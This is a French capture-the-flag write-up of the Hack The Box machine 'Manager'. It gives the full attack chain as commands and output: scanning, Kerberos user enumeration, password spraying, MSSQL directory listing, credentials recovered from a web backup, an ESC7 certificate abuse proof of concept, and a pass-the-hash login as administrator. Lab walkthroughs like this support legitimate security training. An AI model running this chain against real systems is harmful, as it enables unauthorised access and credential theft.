  # Manager

	echo "10.10.11.236 manager.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.236 -e tun0 > ports.txt
	sudo nmap -p- -T4 -A 10.10.11.236 -oN nmap.txt
	
Scans classiques.

    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    80/tcp    open  http          Microsoft IIS httpd 10.0
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-01 12:47:52Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
    1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
    3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    9389/tcp  open  mc-nmf        .NET Message Framing
    49667/tcp open  msrpc         Microsoft Windows RPC
    49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49688/tcp open  msrpc         Microsoft Windows RPC
    49689/tcp open  msrpc         Microsoft Windows RPC
    49728/tcp open  msrpc         Microsoft Windows RPC
    64517/tcp open  msrpc         Microsoft Windows RPC
    64802/tcp open  tcpwrapped

Rien sur le site.
    
On a affaire à une machine Windows, j'ai donc testé quelques points d'énumération classiques :
<br>- SMB
<br>- LDAP
<br>- RPC
<br>- Kerberos

    enum4linux -a 10.10.11.236
    
    nmap -n -sV --script "ldap* and not brute" -p 389 10.10.11.236
    
    ldapsearch -x -b "dc=manager,dc=htb" -H ldap://10.10.11.236
    
    rpcclient -U "" -N 10.10.11.236

    ./kerbrute_linux_386 userenum -d MANAGER.HTB --dc 10.10.11.236 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt 

Cette dernière commande nous sort un grand nombre d'utilisateurs valides : 

    2023/11/01 08:37:09 >  [+] VALID USERNAME:       ryan@MANAGER.HTB
    2023/11/01 08:37:12 >  [+] VALID USERNAME:       guest@MANAGER.HTB
    2023/11/01 08:37:13 >  [+] VALID USERNAME:       cheng@MANAGER.HTB
    2023/11/01 08:37:15 >  [+] VALID USERNAME:       raven@MANAGER.HTB
    2023/11/01 08:37:21 >  [+] VALID USERNAME:       administrator@MANAGER.HTB
    2023/11/01 08:37:35 >  [+] VALID USERNAME:       Ryan@MANAGER.HTB
    2023/11/01 08:37:37 >  [+] VALID USERNAME:       Raven@MANAGER.HTB
    2023/11/01 08:37:44 >  [+] VALID USERNAME:       operator@MANAGER.HTB
    2023/11/01 08:38:42 >  [+] VALID USERNAME:       Guest@MANAGER.HTB
    2023/11/01 08:38:42 >  [+] VALID USERNAME:       Administrator@MANAGER.HTB
    2023/11/01 08:39:29 >  [+] VALID USERNAME:       Cheng@MANAGER.HTB
    2023/11/01 08:41:40 >  [+] VALID USERNAME:       jinwoo@MANAGER.HTB
    2023/11/01 08:42:02 >  [+] VALID USERNAME:       RYAN@MANAGER.HTB
    2023/11/01 08:43:18 >  [+] VALID USERNAME:       RAVEN@MANAGER.HTB
    2023/11/01 08:43:23 >  [+] VALID USERNAME:       GUEST@MANAGER.HTB
    2023/11/01 08:45:31 >  [+] VALID USERNAME:       Operator@MANAGER.HTB

    
En les mettant dans un fichier que l'on passera à CrackMapExec on peut faire du password spraying et du bruteforcing : 

    cat users.txt | cut -d: -f4 | sed 's/@MANAGER\.HTB//' | tr -d " " > users_clean.txt
    
    crackmapexec smb manager.htb -u users_clean.txt -p "" --continue-on-success
    
    crackmapexec smb manager.htb -u users_clean.txt -p users_clean.txt --continue-on-success

La première commande révèle un compte Guest sans mot de passe.

La deuxième commande révèle que le compte Operator a mis son nom en mot de passe.

Avec ce compte, on va pouvoir tenter de se connecter aux différents services : 

    evil-winrm -u 'MANAGER.HTB\operator' -p 'operator' -i 10.10.11.236
    
    smbclient -U "MANAGER.HTB\operator" -L 10.10.11.236
    
    impacket-mssqlclient operator:operator@10.10.11.236 -windows-auth

Seule la connexion à la base de données fonctionne, mais cette dernière ne semble pas contenir de données pertinentes. 

Pour l'énumération du contenu de la base, voir : https://github.com/TimotheMaammar/Fiches/blob/main/Antisèche_OSCP.md#bases-de-données 

Comme on est sur du MSSQL, la dernière option est l'exécution de commandes.

Voir : https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

Quelques commandes à tester : 

	xp_cmdshell
	enable_xp_cmdshell
	sp_start_job
	xp_dirtree

Cette dernière commande est la seule à fonctionner, on doit donc espérer tomber sur un fichier intéressant. Et on finit par en trouver un dans **C:\inetpub\wwwroot** : 

	SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
	subdirectory                      depth   file   
	-------------------------------   -----   ----   
	about.html                            1      1   

	contact.html                          1      1   

	css                                   1      0   

	images                                1      0   

	index.html                            1      1   

	js                                    1      0   

	service.html                          1      1   

	web.config                            1      1   

	website-backup-27-07-23-old.zip       1      1   


Ce fichier de sauvegarde attire l'attention, et comme il est placé à la racine du site il sera possible de le télécharger puis de l'inspecter

	curl http://manager.htb/website-backup-27-07-23-old.zip --output backup.zip
	unzip backup.zip
	grep -r -i "password"
	cat .old-conf.xml

On trouve le morceau suivant dans **.old-conf.xml** :

	<user>raven@manager.htb</user>  
	<password>R4v3nBe5tD3veloP3r!123</password>

	
Et cet utilisateur a les droits de connexion WinRM contrairement au premier : 

	evil-winrm -u 'MANAGER.HTB\raven' -p 'R4v3nBe5tD3veloP3r!123' -i 10.10.11.236
	cd ../Desktop 
	type user.txt



## Élévation de privilèges

	upload PrivEscCheck.ps1
	Import-Module .\PrivEscCheck.ps1
	Invoke-PrivEscCheck -Extended
    
    upload winpeas.exe
    .\winpeas.exe 
    
    certipy find -u raven@MANAGER.HTB -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236


Certipy a trouvé un certificat vulnérable : 

    
    [!] Vulnerabilities
    ESC7 : 'MANAGER.HTB\\Raven' has dangerous permissions
    Certificate Templates
      0
        Template Name                       : KerberosAuthentication
        Display Name                        : Kerberos Authentication
        Certificate Authorities             : manager-DC01-CA
        Enabled                             : True
        ...
    
Voir https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7


Je n'ai pas réussi à finir l'exploitation de l'ESC7 mais j'ai trouvé un POC pour quand même pouvoir finir la VM : https://github.com/saoGITo/HTB_Manager/blob/main/HTB_Manager_poc.py


    python HTB_Manager_poc.py 

Le script nous retourne bien le hash de l'administrateur.

    impacket-psexec manager.htb/administrator@manager.htb -hashes aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef -dc-ip 10.10.11.236
    ...
    type C:\Users\Administrator\Desktop\root.txt
